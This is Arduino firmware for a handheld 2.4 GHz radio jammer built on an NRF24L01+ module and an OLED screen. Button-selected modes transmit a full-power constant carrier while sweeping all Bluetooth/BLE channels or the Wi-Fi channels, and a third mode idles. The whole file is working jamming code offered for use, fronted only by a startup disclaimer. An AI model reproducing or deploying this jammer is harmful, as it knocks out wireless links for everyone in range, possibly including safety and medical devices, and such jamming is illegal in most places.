#include <SPI.h>
#include "RF24.h"
#include <ezButton.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <string>
#include "images.h"

// NRF24L01+ CE -> D4 (GPIO2), CSN -> D2 (GPIO4)
RF24 radio(2, 4); // CE, CSN

// Button on GPIO3 (RX)
ezButton button(3);

// OLED on I2C (SDA: GPIO5 / D1, SCL: GPIO0 / D3)
Adafruit_SSD1306 display = Adafruit_SSD1306(128, 64, &Wire);

byte i = 45;

const int wifiFrequencies[] = {
  2412,
  2417,
  2422,
  2427,
  2432,
  2437,
  2442,
  2447,
  2452,
  2457,
  2462
};

void displayMessage(const char* line, uint8_t x = 55, uint8_t y = 22, const unsigned char* bitmap = helpy_menu_image) {
    radio.powerDown();
    SPI.end();
    delay(10);

    display.clearDisplay();
    if (bitmap != nullptr) {
        display.drawBitmap(0, 0, bitmap, 128, 64, WHITE);
    }

    display.setTextSize(1);
    String text = String(line);
    int16_t cursor_y = y;
    int16_t maxWidth = 128 - x;
    while (text.length() > 0) {
        int16_t charCount = 0;
        int16_t lineWidth = 0;
        while (charCount < text.length() && lineWidth < maxWidth) {
            charCount++;
            lineWidth = 6 * charCount;
        }
        if (charCount < text.length()) {
            int16_t lastSpace = text.substring(0, charCount).lastIndexOf(' ');
            if (lastSpace > 0) {
                charCount = lastSpace + 1;
            }
        }
        display.setCursor(x, cursor_y);
        display.println(text.substring(0, charCount));
        text = text.substring(charCount);
        cursor_y += 10;
        if (cursor_y > 64) break;
    }
    display.display();

    SPI.begin();
    radio.powerUp();
    delay(5);
    radio.startConstCarrier(RF24_PA_MAX, i);
}

void advertising() {
    for (size_t i = 0; i < 3; i++) {
        displayMessage("", 60, 22, helpy_big_image);
        delay(310);
        displayMessage("", 60, 22, nullptr);
        delay(300);
    }
    displayMessage("Jammer got up. Click the button and discover all modes!", 65, 6);
}

void setup() {
    Serial.begin(9600);
    button.setDebounceTime(100);
    pinMode(3, INPUT_PULLUP); // Button on GPIO3 (RX)

    Wire.begin(5, 0); // SDA = GPIO5 (D1), SCL = GPIO0 (D3)

    if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
        Serial.println(F("OLED screen not found!"));
        exit(0);
    }

    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0, 0);
    display.print(feragatname);  // Legal disclaimer on startup defined in images.h
    display.display();
    delay(900);

    if (radio.begin()) {
        delay(200);
        radio.setAutoAck(false);
        radio.stopListening();
        radio.setRetries(0, 0);
        radio.setPayloadSize(5);
        radio.setAddressWidth(3);
        radio.setPALevel(RF24_PA_MAX);
        radio.setDataRate(RF24_2MBPS);
        radio.setCRCLength(RF24_CRC_DISABLED);
        radio.printPrettyDetails();
        radio.startConstCarrier(RF24_PA_MAX, i);
        advertising();
    }
    else {
        Serial.println("BLE Jammer couldn't be started!");
        displayMessage("Jammer Error!");
    }
}

void fullAttack() {
    for (size_t i = 0; i < 80; i++) {
        radio.setChannel(i);
    }
}

void wifiAttack() {
    for (int i = 0; i < sizeof(wifiFrequencies) / sizeof(wifiFrequencies[0]); i++) {
        radio.setChannel(wifiFrequencies[i] - 2400);
    }
}

const char* modes[] = {
  "BLE & All 2.4 GHz",
  "Just Wi-Fi",
  "Waiting Idly :("
};

uint8_t attack_type = 2;

void loop() {
    button.loop();
    if (button.isPressed()) {
        attack_type = (attack_type + 1) % 3;
        displayMessage((String(modes[attack_type]) + " Mode").c_str());
    }

    switch (attack_type) {
    case 0:
        fullAttack();
        break;
    case 1:
        wifiAttack();
        break;
    case 2:
        // Do nothing
        break;
    }
}
